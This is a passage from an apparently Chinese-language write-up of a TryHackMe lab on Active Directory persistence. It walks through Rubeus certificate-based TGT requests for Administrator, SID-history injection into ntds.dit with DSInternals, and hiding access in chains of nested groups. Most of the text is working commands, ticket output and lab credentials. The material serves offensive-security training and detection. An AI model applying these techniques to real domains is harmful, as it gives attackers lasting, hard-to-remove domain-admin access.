<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">13</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">22</span> AM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">12</span> PM    &lt;DIR&gt;          Windows
               <span class="hljs-number">7</span> <span class="hljs-built_in">File</span>(s)      <span class="hljs-number">2</span>,<span class="hljs-number">356</span>,<span class="hljs-number">811</span> bytes
               <span class="hljs-number">7</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">50</span>,<span class="hljs-number">914</span>,<span class="hljs-number">541</span>,<span class="hljs-number">568</span> bytes free</code></pre>
<h2 id="我们不再是蓝队的朋友">我们不再是蓝队的朋友</h2>
<p>证书持久性的防御难度要大得多。即使您轮换受感染帐户的凭据，证书仍然有效。消除持久性的唯一方法是吊销证书。但是，只有当我们通过合法渠道生成证书时，这才可能实现。由于我们导出了 CA 并自己生成了证书，因此它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法撤销我们的证书。</p>
<p>那么消除持久性的唯一解决方案是什么？好吧，这就是为什么我们不再是朋友了。他们必须吊销根 CA 证书。但是吊销这个证书意味着AD CS颁发的所有证书都会突然失效。这意味着他们必须为每个使用 AD CS 的系统生成新证书。您应该开始明白为什么这种类型的持久性非常危险，并且如果执行则需要完全重建系统。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185428443.png" alt="image-20240229185428443"></p>
<p>这里又找了几篇文章找到了解决办法，就是rdp连接目标服务器更改一下配置</p>
<pre><code class="hljs scss">xfreerdp /d:za.tryhackme.loc /u:<span class="hljs-string">'Administrator'</span> /p:<span class="hljs-string">'tryhackmewouldnotguess1@'</span> /v:THMDC.za.tryhackme.loc /cert:ignore +clipboard

#使用run弹窗，执行gpedit.<span class="hljs-built_in">msc</span>(或者在win搜索栏中搜索gpedit)
#编辑组策略-&gt;计算机配置-&gt;windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;配置Kerberos允许的加密类型(右键编辑属性，勾选需要的加密类型选项并确定即可)
#编辑组策略-&gt;计算机配置-&gt;管理模版-&gt;系统-&gt;KDC-&gt;将KDC support for PKInit Freshness Extension设定为Enable

#通过RDP界面重启DC并退出rdp界面，然后继续在我们使用低权限AD用户所访问的THMWRK1跳板主机上进行操作。</code></pre>
<pre><code class="hljs scss">za\pauline<span class="hljs-selector-class">.hargreaves</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\pauline.hargreaves&gt;<span class="hljs-attribute">C</span>:\Tools\Rubeus.exe asktgt /u
<span class="hljs-attribute">ser</span>:Administrator /<span class="hljs-attribute">enctype</span>:aes256 /<span class="hljs-attribute">certificate</span>:hybcx.pfx /<span class="hljs-attribute">password</span>:Password123 /outfile
:fullAdmin.kirbi /<span class="hljs-attribute">domain</span>:za.tryhackme.loc /<span class="hljs-attribute">dc</span>:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span>                            
                                                                                       
   ______        _                                                                     
  (_____ \      | |                                                                    
   _____) )_   _| |__  _____ _   _  ___                                                
  |  __  /| | | |  _ \| ___ | | | |/___)                                               
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                               
  |_|   |_|____/|____/|_____)____/(___/                                                
                                                                                       
  v2.<span class="hljs-number">0.0</span>                                                                               
                                                                                       
[*] <span class="hljs-attribute">Action</span>: Ask TGT                                                                    
                                                                                       
[*] Using PKINIT with etype aes256_cts_hmac_sha1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">subject</span>: CN=User                  
[*] Building AS-REQ (w/ PKINIT preauth) <span class="hljs-attribute">for</span>: <span class="hljs-string">'za.tryhackme.loc\Administrator'</span>          
[+] TGT request successful!                                                            
[*] base64(ticket.kirbi):                                                              
                                                                                       
      doIGDDCCBgigAwIBBaEDAgEWooIFADCCBPxhggT4MIIE9KADAgEFoRIbEFpBLlRSWUhBQ0tNRS5MT0Oi 
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHphLnRyeWhhY2ttZS5sb2OjggSwMIIErKADAgESoQMCAQKiggSe 
      BIIEmnF/<span class="hljs-number">9</span>r7X9Pi3J5uFeicRkVIOxP+dx7taz8l3i/<span class="hljs-number">5</span>hmApbCp6Iv7JoesIpz2iqnSoH7Q9y+UvSNQ6R 
      Iy6fF7ONLE0g//wCiYnxMV/zHiwHMmWLnRwv8jd7xnZMfel+GGybT24Ku0Q9xiQDvIBu4f6xX6Xbo6MP 
      nEFQmZO3WJ8w8vpibzZVPlHu0oUaxFKkZyBNe8Sg38QgT9QGdetO10OYS1pYThbrZSYJ2r2KJQpfr88S 
      YGrRGuQDxoql/x13hbourVdLNbp6jUlhQOH0aoCrtSf2BedwtjL3F/kDYtdpHGlhj5hjoJQZHBrzeUhJ 
      j0Pljx7AOHVnjoDs6jWE7avyZZY6FbyUzR7+U5u7kdjysh4Ag976Sbp2mMTXFjzQ73qwSaiQr4Ehek71 
      QlCnNO8bKnE91QvSFwOTVRQQ9t4qqnjlJph/A1wSo5c7b9GAATVrfA7hPGZAN//Qq8v6B0m/+ofvcgle 
      PjCtGgtc943usjP7ScE1EhlLyEWVwJLoMLVdmxWf7Q7yOjExPLXfAoOGIY5k+I8x0FbL0lXbteB1QxXJ 
      <span class="hljs-number">6</span>GMQ/xMun1yzqujxJlIa8To2OaLkO7+yPZw3AbcKG4bA+js75KmXvYWcnqATwSAGMV8izTdnZkozvVmA 
      dqpB3Qr+uMLoYbQTGjCNZXngkP9CFVyGWq3o5O/WT9JQLbjM2+h3gfi+XlPvhxTDDna6k7BKIApG+/zI 
      uZ3zTP/gtVyzuyWGWk1fmpgjJ4S7GLpKn9Z3OMSPoNglZDiLWiMYISboKF+kFAfTG3zSSgRrY0AhA66k 
      <span class="hljs-number">2</span>wjlamdKikiXQh4iHIGa+tdTcugewpbq3VSNKDm9HOiVcolopdZtPg/g3KjClPl26J/<span class="hljs-number">3</span>QFllJ++<span class="hljs-number">3</span>GU+<span class="hljs-number">5</span> 
      rFs2DTHAE8t6+RPKbootHGXiLNtycl+s3MXaceP7PV9AoJwlrvCAAcOrjzSrJJIC2dCPJFHkODusomPj 
      qRBF6HhzutUz4T8lE6EUzOR4NelcEJDiy939qmetTCq1WI24y/mrRlsS2XmZ+<span class="hljs-number">12</span>Z+zqiVcWKZsalA6MB 
      NmbiTXFwklKr+/TUDrboJfyqmG8kFnmvgbScaHTzE7DSWIi6PUfgciBRbXyLuVKuKOadvc7C0I6MjPbk 
      <span class="hljs-number">3</span>a2qc2BrtKLsRfv1hWI0HLl2W7tP3zE3zLONvrby5QToJJsMS1vY5hfvWw9+YwRtWfYZQl2dmeQMABLG 
      nA3X2YyCUH+<span class="hljs-number">1</span>GIoKoR5hy5I00Vg/Ak/XgYBv1+<span class="hljs-number">2</span>D7jtnj8vOvQWAvZeslxRFxsMGuBrK4pIp1NjKVXVM 
      /bbkULqjLn6VQnsvLPMkA4VmRGU0AF9fzzqAjYSQdGuC923RMdPXehHuLv0XygNuivSAb1mBmf2951wX 
      ZDZCbDlStQNRF2NLOh4qp7y9cRTi+v4W/<span class="hljs-number">9</span>JuKdO4oFw0zRBZkPokUcsnc0Rwu2r3ImRHMoEJlgl7qOYt 
      HOOtohfrOqKfZ+Ls6PVDuxYYUtUUaJGs6DglIabScfvGrN/zBxUOmk5ea3R94fNQhMaEZyQH4ALm14aP 
      vUdkxstdTwXyxuPpj1PSj3t8jasO/CyQWWqN6iVCrCjOlc6mq2gPU0y2o4H3MIH0oAMCAQCigewEgel9 
      geYwgeOggeAwgd0wgdqgKzApoAMCARKhIgQgd7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVqh 
      EhsQWkEuVFJZSEFDS01FLkxPQ6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEDhAAClERgP 
      MjAyNDAyMjkxMTM5MjBaphEYDzIwMjQwMjI5MjEzOTIwWqcRGA8yMDI0MDMwNzExMzkyMFqoEhsQWkEu 
      VFJZSEFDS01FLkxPQ6klMCOgAwIBAqEcMBobBmtyYnRndBsQemEudHJ5aGFja21lLmxvYw==         
                                                                                       
[*] Ticket written to fullAdmin.kirbi                                                  
                                                                                       
                                                                                       
  ServiceName              :  krbtgt/za.tryhackme.loc                                  
  ServiceRealm             :  ZA.TRYHACKME.LOC                                         
  UserName                 :  Administrator                                            
  UserRealm                :  ZA.TRYHACKME.LOC                                         
  StartTime                :  <span class="hljs-number">2</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> AM                                    
  EndTime                  :  <span class="hljs-number">2</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span> <span class="hljs-number">9</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> PM                                     
  RenewTill                :  <span class="hljs-number">3</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">20</span> AM                                     
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwa
rdable                                                                                 
  KeyType                  :  aes256_cts_hmac_sha1                                     
  Base64(key)              :  d7iXvd7xTz/ZXRGvP+Iof3piKRTjXgaamnmziQZXYVo=             
  ASREP (key)              :  B99608280DACD112BC2886CA0DFAF854C1DD09EDA0D5143A94ABE96E9
<span class="hljs-number">01580</span>EE</code></pre>
<p>之后再次尝试终于成功</p>
<pre><code class="hljs scss">za\pauline<span class="hljs-selector-class">.hargreaves</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\pauline.hargreaves&gt;dir \\THMDC.za.tryhackme.loc\
c$\                                                                                    
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows                                
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9                                                     
                                                                                       
 Directory of \\THMDC.za.tryhackme.loc\c$                                              
                                                                                       
<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1                         
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">11</span> AM               <span class="hljs-number">169</span> dns_entries.csv                                 
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">07</span>:<span class="hljs-number">19</span> AM              PerfLogs                                        
<span class="hljs-number">05</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> AM              Program Files                                   
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">08</span>:<span class="hljs-number">28</span> PM              Program Files (x86)                             
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">05</span> PM             <span class="hljs-number">7</span>,<span class="hljs-number">168</span> shell.exe                                       
<span class="hljs-number">05</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">17</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">725</span> thm-network-setup-dc.ps1                        
<span class="hljs-number">07</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">03</span>:<span class="hljs-number">38</span> PM              tmp                                             
<span class="hljs-number">06</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">01</span>:<span class="hljs-number">58</span> PM              Tools                                           
<span class="hljs-number">02</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> AM              Users                                           
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">06</span>:<span class="hljs-number">11</span> PM         vagrant [\\vboxsvr\vagrant]                     
<span class="hljs-number">07</span>/<span class="hljs-number">03</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">51</span> AM              Windows                                         
               <span class="hljs-number">4</span> File(s)          <span class="hljs-number">9</span>,<span class="hljs-number">165</span> bytes                                          
               <span class="hljs-number">8</span> Dir(s)  <span class="hljs-number">51</span>,<span class="hljs-number">454</span>,<span class="hljs-number">889</span>,<span class="hljs-number">984</span> bytes free</code></pre>
<h1 id="0x05-通过-sid-历史记录进行持久化">0x05 通过 SID 历史记录进行持久化</h1>
<p>安全标识符 (SID) 之前已讨论过。但回顾一下，SID 用于在连接到资源时跟踪安全主体和帐户的访问权限。然而，帐户有一个有趣的属性，称为 SID 历史记录。</p>
<p>SID 历史记录的合法用例是使一个帐户的访问权限能够有效地克隆到另一个帐户。当组织忙于执行 AD 迁移时，这一点非常有用，因为它允许用户在迁移到新域时保留对原始域的访问权限。在新域中，用户将拥有新的 SID，但我们可以将用户现有的 SID 添加到 SID 历史记录中，这仍然允许他们使用新帐户访问先前域中的资源。虽然 SID 历史记录有利于迁移，但我们作为攻击者也可以滥用此功能来实现持久性。</p>
<p>历史可以是我们想要的任何样子</p>
<p>问题是，SID 历史记录并不仅限于包含来自其他域的 SID。有了正确的权限，我们只需将当前域的 SID 添加到我们控制的帐户的 SID 历史记录中即可。关于这种持久性技术的一些有趣的注释：</p>
<ul>
<li>我们通常需要域管理员权限或同等权限才能执行此攻击。</li>
<li>当帐户创建登录事件时，与该帐户关联的 SID 将添加到用户的令牌中，然后由该令牌确定与该帐户关联的权限。这包括组 SID。</li>
<li>如果我们注入企业管理员 SID，我们可以进一步采取这种攻击，因为这会提升帐户的权限，使其成为林中所有域中的域管理员。</li>
<li>由于 SID 已添加到用户的令牌中，因此即使该帐户不是实际组的成员，也会尊重权限。这使得这是一种非常狡猾的持久方法。我们拥有危害整个域（也许是整个林）所需的所有权限，但我们的帐户可以只是一个普通用户帐户，仅具有域用户组的成员身份。通过始终使用此帐户来更改另一个帐户的 SID 历史记录，我们可以将偷偷摸摸的行为提升到另一个级别，因此初始持久性向量不那么容易被发现和补救。</li>
</ul>
<h2 id="锻造历史">锻造历史</h2>
<p>在下一步中，使用管理员凭据在THMDC上获取一个SSH会话。在伪造SID历史之前，让我们首先获取一些关于SID的信息。首先，确保我们的低权限用户当前没有任何SID历史信息：</p>
<p>Your credentials have been generated: Username: louis.cole Password: Password!</p>
<pre><code class="hljs scss">za\administrator<span class="hljs-keyword">@THMDC</span> <span class="hljs-attribute">C</span>:\Users\Administrator&gt;powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS <span class="hljs-attribute">C</span>:\Users\Administrator&gt; Get-ADUser louis.cole -Properties sidhistory,memberof


DistinguishedName : CN=pauline.hargreaves,OU=Sales,OU=People,DC=za,DC=tryhackme,DC=loc 
Enabled           : True
GivenName         : Pauline
MemberOf          : {CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : pauline.hargreaves
ObjectClass       : user
ObjectGUID        : daa57f4b-cdf8-<span class="hljs-number">48</span>a0-<span class="hljs-number">8</span>e92-<span class="hljs-number">8</span>e03c7b88c54
SamAccountName    : pauline.hargreaves
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1121</span>
SIDHistory        : {}
Surname           : Hargreaves
UserPrincipalName :</code></pre>
<p>可以看到这里sid历史为空：这证实我们的用户当前没有设置任何 SID 历史记录。让我们获取 Domain Admins 组的 SID，因为这是我们要添加到 SID 历史记录中的组：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083646807.png" alt="image-20240301083646807"></p>
<p>我们可以使用 Mimikatz 之类的东西来添加 SID 历史记录。然而，最新版本的 Mimikatz 有一个缺陷，不允许它修补 LSASS 来更新 SID 历史记录。因此我们需要使用其他东西。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p>
<pre><code class="hljs scss">Install-Module DSInternals -Force
Import-Moduls DSInternals
<span class="hljs-comment">//这里在下载的时候一直报错，不知为何，尝试了半天无果，发现目标机已经有改工具了。。。</span>

Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'louis<span class="hljs-selector-class">.cole</span>' -SidHistory 'S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">512</span>' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301083942800.png" alt="image-20240301083942800"></p>
<p>NTDS 服务运行时，NTDS 数据库被锁定。为了修补我们的 SID 历史记录，我们必须首先停止该服务。补丁完成后必须重新启动NTDS服务，否则整个网络的认证将无法进行。</p>
<p>执行这些步骤后，让我们使用低权限凭据通过 SSH 登录到 THMWRK1，并验证是否已添加 SID 历史记录以及我们现在是否具有域管理员权限：</p>
<pre><code class="hljs scss">za\louis<span class="hljs-selector-class">.cole</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\louis.cole&gt;powershell -ep bypass                        
Windows PowerShell                                                                     
Copyright (C) Microsoft Corporation. All rights reserved.                              
                                                                                       
PS <span class="hljs-attribute">C</span>:\Users\louis.cole&gt; Get-ADUser louis.cole -Properties sidhistory                   
                                                                                       
                                                                                       
DistinguishedName : CN=louis.cole,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc    
Enabled           : True                                                               
GivenName         : Louis                                                              
Name              : louis.cole                                                         
ObjectClass       : user                                                               
ObjectGUID        : bf78bdb9-<span class="hljs-number">3289</span>-<span class="hljs-number">461</span>d-<span class="hljs-number">8193</span>-d7fd88d3b23b                               
SamAccountName    : louis.cole                                                         
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1120</span>                     
SIDHistory        : {S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">512</span>}                    
Surname           : Cole                                                               
UserPrincipalName :</code></pre>
<pre><code class="hljs scss">PS C:\Users\louis.cole&gt; dir \\thmdc.za.tryhackme.loc\c$                                
                                                                                       
                                                                                       
    Directory: \\thmdc.za.tryhackme.loc\c$                                             
                                                                                       
                                                                                       
Mode                LastWriteTime         Length Name                                  
----                -------------         ------ ----                                  
d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">19</span> AM                PerfLogs                              
d-r---        <span class="hljs-number">5</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">32</span> AM                Program Files                         
d-----        <span class="hljs-number">3</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">8</span>:<span class="hljs-number">28</span> PM                Program Files (x86)                   
d-----         <span class="hljs-number">7</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">4</span>:<span class="hljs-number">38</span> PM                tmp                                   
da----        <span class="hljs-number">6</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">58</span> PM                Tools                                 
d-r---        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">10</span>:<span class="hljs-number">29</span> PM                Users                                 
d----l        <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">11</span> PM                vagrant                               
d-----         <span class="hljs-number">7</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">51</span> AM                Windows                               
-a----         <span class="hljs-number">1</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span>:<span class="hljs-number">47</span> AM            <span class="hljs-number">103</span> delete-vagrant-user.ps1               
-a----         <span class="hljs-number">5</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">11</span> AM            <span class="hljs-number">169</span> dns_entries.csv                       
-a----         <span class="hljs-number">7</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">6</span>:<span class="hljs-number">05</span> PM           <span class="hljs-number">7168</span> shell.exe                             
-a----         <span class="hljs-number">5</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">17</span> AM           <span class="hljs-number">1725</span> thm-network-setup-dc.ps1</code></pre>
<p>根据上面的输出，效果很好！我们能够伪造我们的 SID 历史记录，授予我们的低特权帐户 DA 访问权限！</p>
<h2 id="蓝队的干草叉和火把">蓝队的干草叉和火把</h2>
<p>如果蓝队通过RDP访问域内主机并使用AD用户和组管理单元，那么蓝队将能够查看添加到当前AD用户的SID历史记录属性；但是，即使蓝队具有最高权限，也无法通过GUI界面直接删除AD用户的SID历史记录属性，因为它是受保护的。</p>
<p>为了成功删除攻击者所添加的SID历史记录，蓝队必须使用诸如AD-RSAT PowerShell cmlet之类的工具；此外，蓝队还必须先找到攻击者所修改的SID历史记录，这需要蓝队成员主动过滤并查看用户的相关属性，否则很难找到恶意的SID 历史记录，因为只有在用户进行身份验证时才会应用和使用这些SID历史记录。</p>
<p>想象一下，您是蓝队，正在处理刚刚执行域名回收的事件。您将 krbtgt 帐户的密码轮换了两次，删除了金票和银票，并从头开始重建了整个 CA 服务器，只是为了看到攻击者仍在使用低权限帐户执行 DA 命令。这不会是美好的一天。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240301084952802.png" alt="image-20240301084952802"></p>
<h1 id="0x06-通过组成员身份实现持久性">0x06 通过组成员身份实现持久性</h1>
<p>如果我们不想篡改SID历史记录，我们可以直接将自己添加到AD组中以实现持久化。虽然 SID 历史记录是一种很好的持久性技术，但凭证轮换和清理仍然可以消除我们的持久性。在某些情况下，通过针对 AD 组本身来执行持久性可能会更好。</p>
<h2 id="通过团体成员身份坚持下去">通过团体成员身份坚持下去</h2>
<p>如任务1所讨论的那样，最高权限的帐户或组并不总是用于持久性的最佳选择。比其他组更密切地监视了特权组的变化。任何被归类为受保护组的组，例如域管理员或企业管理员，都会接受额外的安全审查。因此，如果我们想通过组成员身份持久存在，我们可能需要在将我们自己的帐户添加到持久性的组时进行创造性的考虑：</p>
<ul>
<li>IT Support组可用于获取诸如强制更改用户密码之类的特殊权限，尽管在大多数情况下，我们可能无法重置特权用户的密码，但是我们能够尝试重置低特权用户的密码并继续将访问权限扩展到目标工作站。</li>
<li>目标域网络所提供的具有本地管理员权限的组通常不会像被保护组那样被密切监控，我们可以通过修改组成员关系，来拥有对目标主机的本地管理员权限。</li>
<li>此类权限维持技术并不总是与直接的特权有关，有时，具有间接特权(例如对组策略对象的所有权)的组也同样适合我们用来实现权限维持。</li>
</ul>
<h2 id="nested-groups嵌套组">Nested Groups(嵌套组)</h2>
<p>在大多数企业网络环境中，都存在大量的递归组。递归组是指某个组是另一个组的成员，我们可以认为这是组嵌套(group nesting)，这种组嵌套可用于在AD域网络中创建更有组织性的结构。</p>
<p>以IT Support(技术支持)组为例，IT Support是一个通用的组，因此，在这个组下面可能会有像Helpdesk、Access Card Managers和Network Managers这样的子组；我们可以将所有这些组作为成员添加到IT Support组中，这将为子组中的所有用户分配与IT Support组相关联的权限和特权，同时我们还可以为每个子组分配更细致的权限和特权。</p>
<p>虽然组嵌套有助于组织AD域网络，但是它确实降低了关于那些具有有效访问权限的AD帐户的可见性。再次以IT Support组为例，如果我们向AD域查询IT Support组的成员，它可能会告诉我们该组有三个成员，然而，这个数字并不真实，因为IT Support组中的三个成员也可以是组。为了更充分地了解具有有效访问权限的帐户数量，我们还必须继续枚举IT Support组中的子组，但是这些子组本身也可以有子组作为成员。那么问题最终就变成了:“我们应该枚举多少层，才能得到真正的具有有效访问权限的AD帐户数目?”(这里的有效访问权限是指由于组成员关系而分配给某个AD帐户的权限)</p>
<p>多层组嵌套关系也会让蓝队更加难以监控权限分配情况，假设当一个新成员被添加到Domain Admins组时会向蓝队发出警报，这是一个很好的警报，但是如果攻击者将用户添加到Domain Admins组中的子组中，则可能并不会触发该警报。这是一个非常常见的问题，因为AD是由AD团队管理的，而警报和监控则是由InfoSec(信息安全)团队管理的；我们作为攻击者所需要的是以上两个团队之间存在一些沟通上的错误，那么当我们使用子组进行用户添加时，就不会有警报消息被发送给蓝队。</p>
<p>作为攻击者，我们可以利用这种被降低的权限分配可见性来尝试执行权限维持操作。我们可以不将目标直接锁定在那些能让我们访问AD域的特权组上，而是转而把注意力集中在子组上，也就是说：我们不添加直接新成员到那些可能会向蓝队发出警报的特权组中，而是将低权限的用户添加到可能未被监控的那些子组中。</p>
<h2 id="基于嵌套组实现权限维持">基于嵌套组实现权限维持</h2>
<p>我们首先使用administrator帐户通过SSH登录到跳板主机，然后创建一个新的基础组，并且将该组隐藏在People-&gt;IT OU(组织单元)中：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path <span class="hljs-string">"OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 1"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup1"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 1"</span> -GroupScope Global -GroupCategory Security</code></pre>
<p>然后让我们在People-&gt;Sales OU(组织单元)中创建另一个组，并且将我们刚才的基础组作为组成员添加进来：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt;New-ADGroup -Path <span class="hljs-string">"OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 2"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup2"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 2"</span> -GroupScope Global -GroupCategory Security 

PS C:\Users\Administrator.ZA&gt;Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup2"</span> -Members <span class="hljs-string">"hybcx_nestgroup1"</span></code></pre>
<p>我们重复执行几次上述两个步骤，每次都将前一个组添加为新的组的成员：</p>
<pre><code class="hljs scss">PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 3"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup3"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 3"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup3"</span> -Members <span class="hljs-string">"hybcx_nestgroup2"</span>

PS C:\Users\Administrator.ZA&gt; New-ADGroup -Path <span class="hljs-string">"OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC"</span> -Name <span class="hljs-string">"hybcx Net Group 4"</span> -SamAccountName <span class="hljs-string">"hybcx_nestgroup4"</span> -DisplayName <span class="hljs-string">"hybcx Nest Group 4"</span> -GroupScope Global -GroupCategory Security

PS C:\Users\Administrator.ZA&gt; Add-ADGroupMember -Identity <span class="hljs-string">"hybcx_nestgroup4"</span> -Members <span class="hljs-string">"hybcx_nestgroup3"</span>

